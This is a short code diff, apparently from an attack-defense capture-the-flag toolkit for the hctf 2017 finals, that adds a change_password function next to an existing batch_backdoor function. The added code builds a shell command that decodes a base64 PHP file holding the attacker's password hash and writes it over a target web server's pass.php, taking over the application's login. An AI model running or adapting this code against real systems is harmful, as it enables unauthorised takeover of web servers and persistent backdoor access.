@@ -296,4 +296,15 @@ def batch_backdoor(target,target_port,cmd):
     debug_print(cmd)
     return cmd
 
+# This function is designed for hctf 2017 finals
+def change_password(target,target_port,cmd):
+    my_password = "haozigege" 
+    my_hash =  hashlib.sha512(my_password).hexdigest()
+    debug_print(my_hash)
+    php_content = "<?php $ww = '%s';?>"%my_hash 
+    php_content_base64 = base64.b64encode(php_content)
+    cmd = "/bin/echo %s | /usr/bin/base64 -d | cat > /var/www/html/data/settings/pass.php"%php_content_base64
+    debug_print(cmd)
+    return cmd
+
 
